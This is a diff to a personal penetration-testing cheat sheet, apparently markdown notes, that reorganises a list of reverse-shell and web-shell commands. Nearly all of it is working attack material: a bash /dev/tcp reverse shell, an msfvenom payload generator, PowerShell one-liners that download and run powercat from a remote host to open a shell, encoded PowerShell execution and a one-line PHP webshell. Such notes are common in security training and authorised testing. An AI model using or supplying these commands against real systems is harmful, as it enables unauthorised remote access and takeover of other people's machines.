@@ -1,7 +1,7 @@
 ---
 sticker: emoji//1f41a
 ---
-#### Shells
+### Reverse Shells
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
 ##### Bash
 ```
@@ -14,11 +14,12 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
 ##### Windows
 ```
+#Generate reverse shell.
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o <filename.exe>
 
-IEX (New-Object System.Net.Webclient).DownloadString("http://<ip>/powercat.ps1");powercat -c <host_ip> -p <port> -e powershell
-
-powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>/powercat.ps1'); powercat -c <ip> -p <port> -e powershell"
+#Using powercat and powershell.
+Method 1. IEX (New-Object System.Net.Webclient).DownloadString("http://<ip>/powercat.ps1");powercat -c <host_ip> -p <port> -e powershell
+Method 2. powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>/powercat.ps1'); powercat -c <ip> -p <port> -e powershell"
 
 ```
 
@@ -39,16 +40,15 @@ powershell -enc "<base64>"
 powershell -a "-enc <base64>"
 ```
 
+### Web Shells
 ##### ASP / ASPX
 
 ```
 https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp
 ```
-
 ### PHP
 
 ```
-#Webshell
 <?php system($_GET['cmd']); ?>
 ```
 
